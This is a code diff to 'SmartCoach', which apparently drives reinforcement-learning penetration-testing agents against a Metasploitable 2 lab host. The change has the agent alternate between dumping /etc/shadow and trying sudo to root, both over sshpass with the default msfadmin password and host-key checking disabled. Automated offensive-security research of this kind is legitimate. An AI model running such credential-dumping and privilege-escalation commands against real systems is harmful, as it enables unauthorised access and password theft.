@@ -1581,22 +1581,42 @@ class SmartCoach:
 
         if _should_escalate:
             target = ctx.target
-            escalation_cmd = (
-                f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.5; "
-                f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
-                f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
-                f"'echo msfadmin | sudo -S id'"
-            )
+            # R53: Alternate between sshpass root attempt and /etc/shadow dump.
+            # R52 showed sshpass fails consistently on MS2 (Permission denied / 
+            # connection issues) — agents stuck 40 steps with only sshpass.
+            # Even-numbered fires → cat /etc/shadow (produces hash_known via parser)
+            # Odd-numbered fires → sshpass root attempt (produces root_shell if works)
+            _escalation_attempt = getattr(self, '_escalation_attempt_count', 0)
+            self._escalation_attempt_count = _escalation_attempt + 1
+            
+            if _escalation_attempt % 2 == 0:
+                # Even: cat /etc/shadow → produces hash_dump discovery → hash_known flag
+                escalation_cmd = (
+                    f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
+                    f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
+                    f"'cat /etc/shadow 2>/dev/null'"
+                )
+                _esc_type = "shadow_dump"
+            else:
+                # Odd: sshpass root attempt → produces root_shell if sudo works
+                escalation_cmd = (
+                    f"pkill -f 'ssh.*{target}' 2>/dev/null; sleep 0.5; "
+                    f"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no "
+                    f"-o HostKeyAlgorithms=+ssh-rsa msfadmin@{target} "
+                    f"'echo msfadmin | sudo -S id'"
+                )
+                _esc_type = "sshpass_root"
+            
             result.command = escalation_cmd
             result.source = "privesc_escalation"
             result.confidence = 0.6
             result.mentor_reasoning = (
-                f"[PHASE-ESCALATION] Forced root attempt after "
+                f"[PHASE-ESCALATION] Forced {_esc_type} after "
                 f"{_escalation_step_count} steps in {_escalation_source_phase}"
             )
             logger.info(
-                f"[{self.agent_name}] [PHASE-ESCALATION] Forced sshpass root "
-                f"attempt at {_escalation_source_phase} step {_escalation_step_count}"
+                f"[{self.agent_name}] [PHASE-ESCALATION] Forced {_esc_type} "
+                f"at {_escalation_source_phase} step {_escalation_step_count}"
             )
             # Store negative PPO trajectory if this overrides a PPO decision
             if self._ppo_pending is not None:
@@ -4514,6 +4534,7 @@ class SmartCoach:
         self._privesc_steps = 0
         self._lateral_steps = 0
         self._privesc_escalation_fired = False
+        self._escalation_attempt_count = 0  # R53: Reset alternating escalation counter
 
         # R42: Reset forced-novel counter per episode
         self._forced_novel_count = 0
